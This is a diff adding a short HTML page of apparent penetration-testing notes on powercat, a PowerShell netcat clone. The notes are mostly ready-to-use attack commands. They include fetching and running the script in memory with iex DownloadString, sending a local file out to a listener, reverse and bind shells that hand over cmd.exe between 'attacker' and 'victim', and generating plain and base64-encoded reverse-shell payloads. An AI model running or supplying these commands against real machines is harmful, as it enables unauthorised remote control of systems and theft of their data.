@@ -1,0 +1,79 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>powercat</title>
+</head><body>PowerShell version of Netcat<br/>
+<br/>
+Kali linux<br/>
+<br/>
+apt install powercat<br/>
+<br/>
+/usr/share/windows-resource/powercat<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+Windows<br/>
+<br/>
+1. Load the function<br/>
+<br/>
+PS&gt; . .\powercat.ps1<br/>
+<br/>
+or<br/>
+<br/>
+PS&gt; iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')<br/>
+<br/>
+<br/>
+<br/>
+2. execute<br/>
+<br/>
+PS&gt; powercat -h<br/>
+<br/>
+<br/>
+<b>File transfer</b><br/>
+<br/>
+receiver<br/>
+sudo nc -lvnp 443 &gt; receiving_data.txt<br/>
+<br/>
+sender<br/>
+powercat -c &lt;receiver ip&gt; -p 443 -i C:\Users\test\data.txt<br/>
+<br/>
+<br/>
+<b>Reverse shell</b><br/>
+<br/>
+attacker<br/>
+<br/>
+sudo nc -lvp 443<br/>
+<br/>
+victim<br/>
+<br/>
+powercat -c &lt;ip attacker&gt; -p 443 -e cmd.exe<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<b>Bind shell</b><br/>
+<br/>
+victim<br/>
+powercat -l -p 443 -e cmd.exe<br/>
+<br/>
+<br/>
+attacker<br/>
+<br/>
+nc &lt;victim ip&gt; 443<br/>
+<br/>
+<br/>
+<b>Generate payload with powercat</b><br/>
+<br/>
+PS&gt; powercat -c &lt;ip attacker&gt; -p 443 -e cmd.exe -g &gt; reverseshell.ps1<br/>
+<br/>
+PS&gt; ./reverseshell.ps1<br/>
+<br/>
+<br/>
+PS&gt; powercat -c &lt;ip attacker&gt; -p 443 -e cmd.exe -ge &gt; encoded_reverseshell.ps1<br/>
+<br/>
+<br/>
+PS&gt; powershell.exe -E &lt;base64 payload&gt;<br/>
+<br/>
+</body></html>
